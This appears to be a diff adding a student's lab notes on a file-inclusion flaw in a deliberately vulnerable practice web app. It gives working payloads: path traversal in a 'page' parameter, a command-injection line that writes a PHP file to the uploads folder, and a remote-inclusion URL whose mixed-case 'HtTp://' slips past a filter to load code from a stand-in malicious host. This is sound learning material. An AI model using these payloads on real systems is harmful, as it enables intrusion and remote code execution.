@@ -1,0 +1,27 @@
+File Inclusion:
+This vulnerability allows us to, through rewriting the url, modify the webpage
+behavior. A way to exploit this is checked by analyzing the url:
+
+http://10.0.23.21/vulnerabilities/fi/?page=include.php
+
+If we change "include.php" to "../sqli_blind/index.php". The page will be a buggy copy of
+http://10.0.23.21/vulnerabilities/sqli_blind/. 
+We know that file location because of the first vulnerability (Command
+execution) which allowed us to study the directory tree of the application.
+
+But now, if we use the first vulnerability again to create a file like this...
+
+$ a || echo "<?php  echo \"H3ll0 W0rld!1! G3t h4x33d! \"; ?>" > ../../hackable/uploads/test.php
+
+And then we modify the url to...
+
+http://10.0.23.21/vulnerabilities/fi/?page=../../hackable/uploads/test.php
+
+We can see a even buggier page that executed our script :)
+
+We can also include external php code hosted in another http server, as there
+is a minimal defense system replacing "http://" to "", we just have to write it
+uppercase as in:
+
+http://10.0.23.21/vulnerabilities/fi/?page=HtTp://maliciouswebpage.com/maliciouscode.php
+
